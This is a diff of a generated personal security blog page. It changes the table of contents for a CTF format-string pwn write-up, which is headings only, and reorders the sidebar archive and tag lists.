+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x01 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-查看-ELF-文件"><span class="toc-number">2.1.</span> <span class="toc-text">1.查看 ELF 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-查看文件保护机制"><span class="toc-number">2.2.</span> <span class="toc-text">2.查看文件保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-用-IDA-逆向"><span class="toc-number">2.3.</span> <span class="toc-text">3.用 IDA 逆向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-运行-pwn"><span class="toc-number">2.4.</span> <span class="toc-text">4.运行 pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-理清思路"><span class="toc-number">2.5.</span> <span class="toc-text">5.理清思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-解题步骤"><span class="toc-number">3.</span> <span class="toc-text">0x02 解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-查找-format-地址的参数偏移"><span class="toc-number">3.1.</span> <span class="toc-text">1.查找 format 地址的参数偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-将-v4-的地址存放在-format-首地址处"><span class="toc-number">3.2.</span> <span class="toc-text">2.将 v4 的地址存放在 format 首地址处</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-其他方法"><span class="toc-number">4.</span> <span class="toc-text">0x03 其他方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Reference"><span class="toc-number">5.</span> <span class="toc-text">0x04 Reference</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -733,234 +715,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -3066,12 +2820,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
         </li>
     
     
@@ -3086,12 +2840,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
         </li>
     
     
@@ -3141,12 +2895,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
         </li>
     
     
@@ -3649,21 +3403,23 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="汇编语言"><span class="iconfont-archer">&#xe606;</span>汇编语言</span>
     
-        <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
-    
         <span class="sidebar-tag-name" data-tags="《保密概论》"><span class="iconfont-archer">&#xe606;</span>《保密概论》</span>
+    
+        <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
     
         <span class="sidebar-tag-name" data-tags="kali"><span class="iconfont-archer">&#xe606;</span>kali</span>
     
         <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
     
-        <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
         <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
@@ -3671,27 +3427,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Virtual machine"><span class="iconfont-archer">&#xe606;</span>Virtual machine</span>
     
-        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
+        <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
     
         <span class="sidebar-tag-name" data-tags="《软件安全分析与应用》"><span class="iconfont-archer">&#xe606;</span>《软件安全分析与应用》</span>
     
-        <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
-    
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
-    
-        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
-        <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
-    
-        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
+        <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
+    
         <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="pwnable.kr"><span class="iconfont-archer">&#xe606;</span>pwnable.kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
     
